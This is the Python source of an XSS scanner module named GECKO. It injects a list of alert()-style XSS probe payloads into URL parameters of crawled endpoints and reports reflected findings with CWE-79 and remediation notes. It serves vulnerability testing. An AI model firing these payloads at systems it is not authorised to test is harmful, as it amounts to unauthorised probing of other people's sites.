"""
GECKO - XSS Scanner
Context-aware reflected/stored XSS detection using crawled endpoints and params.
"""
import asyncio
import re
from urllib.parse import urlencode, urlparse, parse_qs, urljoin


XSS_PAYLOADS = [
    ('<script>alert("g3ck0xss")</script>', "Script tag injection"),
    ('"><img src=x onerror=alert("g3ck0xss")>', "img onerror injection"),
    ("'><svg/onload=alert('g3ck0xss')>", "SVG onload injection"),
    ('"><details open ontoggle=alert("g3ck0xss")>', "HTML5 event handler"),
    ('javascript:alert("g3ck0xss")', "JavaScript URI"),
    ('<body onload=alert("g3ck0xss")>', "Body onload"),
    ('{{g3ck0xss}}', "Template expression (SSTI probe)"),
    ('${g3ck0xss}', "Template literal probe"),
]

MARKER = "g3ck0xss"


def _inject_param(url, param, value):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    return parsed._replace(query=new_query).geturl()


def _build_url_with_params(base_url, params_dict):
    parsed = urlparse(base_url)
    if parsed.query:
        return base_url
    if params_dict:
        query = urlencode({p: "test" for p in list(params_dict)[:5]})
        return parsed._replace(query=query).geturl()
    return base_url


class XSSScanner:
    name = "xss"
    severity = "high"

    async def run(self, target, session, context):
        findings = []
        seen = set()

        endpoints = list(context.get("endpoints") or [])
        params = list(context.get("params") or [])

        # Fallback: test target with common params
        if not params:
            params = ["q", "search", "query", "id", "name", "input", "page", "redirect"]
        if not endpoints:
            endpoints = [target]

        # Filter to endpoints that look HTML-serving (not pure APIs returning JSON)
        html_endpoints = [e for e in endpoints if not any(
            seg in e for seg in ["/api/", "/rest/", ".json", ".xml"]
        )][:20]

        # Also test API endpoints with params (reflected JSON XSS)
        api_endpoints = [e for e in endpoints if "/api/" in e or "/rest/" in e][:10]
        all_test_endpoints = html_endpoints + api_endpoints

        tasks = []
        for endpoint in all_test_endpoints:
            # Test params embedded in URL query string
            parsed = urlparse(endpoint)
            url_params = list(parse_qs(parsed.query).keys())
            test_params = url_params if url_params else params[:8]

            for param in test_params:
                for payload, technique in XSS_PAYLOADS:
                    key = f"{endpoint}|{param}|{technique}"
                    if key not in seen:
                        seen.add(key)
                        tasks.append(_test_xss(session, endpoint, param, payload, technique))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, dict):
                findings.append(r)

        return findings


async def _test_xss(session, endpoint, param, payload, technique):
    try:
        url = _inject_param(endpoint, param, payload)
        r = await session.get(url, timeout=8, follow_redirects=True)
        ct = r.headers.get("content-type", "")
        body = r.text

        if MARKER in body:
            # Check if it's actually unencoded (not &lt;script&gt; etc)
            if re.search(re.escape(payload[:20]), body):
                return {
                    "type": "Reflected XSS",
                    "severity": "HIGH",
                    "endpoint": endpoint,
                    "parameter": param,
                    "payload": payload,
                    "technique": technique,
                    "evidence": f"Marker '{MARKER}' found unencoded in response",
                    "confidence": "HIGH",
                    "cwe": "CWE-79",
                    "owasp": "A03:2021",
                    "remediation": "HTML-encode all user-controlled output; implement strict CSP",
                }
            # Weak reflection (marker present but maybe encoded)
            return {
                "type": "Potential XSS (Weak Reflection)",
                "severity": "MEDIUM",
                "endpoint": endpoint,
                "parameter": param,
                "payload": payload,
                "technique": technique,
                "evidence": f"Marker '{MARKER}' reflected (verify manually)",
                "confidence": "LOW",
                "cwe": "CWE-79",
                "owasp": "A03:2021",
            }
    except Exception:
        pass
    return None
